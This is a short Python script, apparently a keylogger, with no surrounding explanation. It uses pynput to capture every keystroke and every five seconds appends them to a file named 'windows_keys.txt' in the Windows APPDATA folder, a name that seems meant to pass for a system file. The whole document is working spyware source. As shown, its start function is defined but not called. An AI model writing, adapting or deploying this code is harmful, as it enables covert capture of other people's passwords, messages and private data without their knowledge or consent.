#!/usr/bin/python
import os
import pynput.keyboard
import threading
keys = ""
path = os.environ["appdata"] + "\\windows_keys.txt"


def process_keys(key):
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        keys = keys + " " + str(key) + " "


def report():
    global keys
    global path
    file = open(path, "a")
    file.write(keys)
    keys = ""
    file.close()
    timer = threading.Timer(5, report)
    timer.start()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()

